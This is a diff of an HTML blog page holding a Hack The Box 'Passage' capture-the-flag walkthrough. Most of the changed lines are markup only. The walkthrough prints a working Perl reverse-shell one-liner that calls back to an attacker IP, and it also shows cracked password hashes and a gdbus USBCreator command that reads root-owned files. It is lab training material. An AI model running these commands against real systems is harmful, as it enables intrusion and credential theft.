@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.83.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.99.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
 <meta name="supported-color-schemes" content="light dark"><title>HTB Passage&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.8a20650921066633f421ce7a745e34cd4032f36a72cc46f51a06d1fe62549284c37e461fd23cd89b3f123ccdc212cd1b.css" integrity="sha384-iiBlCSEGZjP0Ic56dF40zUAy82pyzEb1GgbR/mJUkoTDfkYf0jzYmz8SPM3CEs0b"><meta name="twitter:card" content="summary" />
 <meta name="twitter:title" content="HTB Passage" /><body><section id="header">
@@ -11,7 +11,7 @@
 <p>Passage is a Ubuntu box. It had a few privesc and a few tricks up it&rsquo;s sleeve to prevent what you might typically do for initial enumeration.</p>
 <h2 id="enumeration">Enumeration</h2>
 <p>A standard nmap scan shows that ssh is running on port 22 and an Apache web server is running on port 80.</p>
-<pre><code>sudo nmap -sV -sC -Pn -oA Passage 10.10.10.206
+<pre tabindex="0"><code>sudo nmap -sV -sC -Pn -oA Passage 10.10.10.206
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 17:14 MDT
 Nmap scan report for 10.10.10.206
 Host is up (0.096s latency).
@@ -35,10 +35,11 @@ Nmap done: 1 IP address (1 host up) scanned in 20.44 seconds
         alt="Fail2Ban"/></p>
 <p>Fail2Ban is a service that can be used to mitigate bruteforce attacks. Because it is implemented here, ffuf or another directory buster is going to be a futile effort.</p>
 <p>Looking through the authors of the articles, two possible users are found, though there isn&rsquo;t an obvious place to make use of them outside of attempting to bruteforce SSH.</p>
-<pre><code>Paul Coles (paul@passege.htb)
+<pre tabindex="0"><code>Paul Coles (paul@passege.htb)
 Admin (nadav@passege.htb)
 </code></pre><p>The nmap scan and browsing on the site revels the CMS in use, Cute News. A quick google finds a Metasploit module on Exploit DB. That module doesn&rsquo;t seem to be functioning out of the box though and a GitHub issue related to it can be found below. There was a fix described but didn&rsquo;t lead to a shell in this case.</p>
-<p><a href="https://github.com/rapid7/metasploit-framework/issues/13246">https://github.com/rapid7/metasploit-framework/issues/13246</a></p>
+<p><a href="https://github.com/rapid7/metasploit-framework/issues/13246"target="_blank" rel="noopener noreferrer">https://github.com/rapid7/metasploit-framework/issues/13246</a>
+</p>
 <h2 id="foothold">Foothold</h2>
 <p>Eventually, I work my way out and am nudged to take a closer look at the source code of the main page. From this we can see a number of resources being loaded from paths that start with <code>CuteNews</code> We navigate to /CuteNews and find a login page.</p>
 <p><img  src="/img/passage-cutelogin.png"
@@ -47,20 +48,21 @@ Admin (nadav@passege.htb)
 <p><img  src="/img/passage-cutedashboard.png"
         alt/></p>
 <p>Once logged in, the bottom of the screen helpfully shows a version number. That leads to a second Exploit DB script.</p>
-<p><a href="https://www.exploit-db.com/exploits/48800">https://www.exploit-db.com/exploits/48800</a></p>
+<p><a href="https://www.exploit-db.com/exploits/48800"target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/48800</a>
+</p>
 <p>It takes exploits CVE-2019-11447 to upload a PHP shell though the avatar upload feature and then further attempts to extract any credentials from, <code>/var/www/html/CuteNews/cdata/users/lines</code> These can then potentially cracked expanding access.</p>
 <p><img  src="/img/passage-foothold.png"
         alt/></p>
 <p>First things first though, upgrade the shell. This works but is far from a full TTY. The old favorite using Bash doesn&rsquo;t return nor does Python2 or 3. However,  Perl does work.</p>
 <h2 id="user">User</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.0.14.11&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
-</code></pre></div><p>The callback is caught with a simple netcat listener and then the shell can be upgraded. <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.0.14.11&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
+</span></span></code></pre></div><p>The callback is caught with a simple netcat listener and then the shell can be upgraded. <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
 <p><a href="https://crackstation.net/"target="_blank" rel="noopener noreferrer">CrackStation</a>
  is a quick way to check certain kinds of hashes. There are a couple matches.</p>
-<pre><code>f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+<pre tabindex="0"><code>f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc:egre55 (crackstation)
 </code></pre><p>CrackStation didn&rsquo;t get all of them though. Hashcat will have to try to do some clean up.</p>
-<pre><code>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+<pre tabindex="0"><code>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1 (hashcat)
 </code></pre><p>Passwords and Users in hand the door is open to check for password reuse. <code>paul</code> isn&rsquo;t perfect. <code>su paul</code> using the password of <code>atlanta1</code> is successful.</p>
@@ -74,10 +76,11 @@ e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1 (hashc
         alt/></p>
 <p>Inside are references to <code>pkexec</code>, which is a binary similar to <code>sudo</code>, and <code>dbus-1</code>. Though logging into Nadav over SSH is possible but the password for Nadav&rsquo;s account is not currently known. This  rules out a simple win from <code>pkexec</code> since it is configured to require a password.</p>
 <p>On the other hand, <code>dbus-1</code> does have vulnerability associated with it.</p>
-<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a></p>
+<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"target="_blank" rel="noopener noreferrer">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>
+</p>
 <p>USBCreator mode can be leveraged to allows us to overwrite arbitrary files as root. Since that is running as root we can effectively read an write as the root user. The below command copies the contents of root.txt over to <code>/tmp/...</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/... true
-</code></pre></div><h2 id="closing-thoughts">Closing thoughts</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/... true
+</span></span></code></pre></div><h2 id="closing-thoughts">Closing thoughts</h2>
 <p>There are a few ways an attacker could get a full shell as root. Root does have valid ssh keys and you could copy these off the same way you got root.txt. Alternatively you could snag <code>/etc/shadow</code> and <code>/etc/passwd</code> and crack the hashes.</p>
 <p>Reuse of credentials was a definite theme ruing the box and I enjoyed learning about the USBCreator vulnerability. It required sudo access but was a bit different than cookie cutter GTFO bin. Thanks to <a href="https://app.hackthebox.eu/users/140851"target="_blank" rel="noopener noreferrer">ChefByzen</a>
  for creating an awesome box!</p>
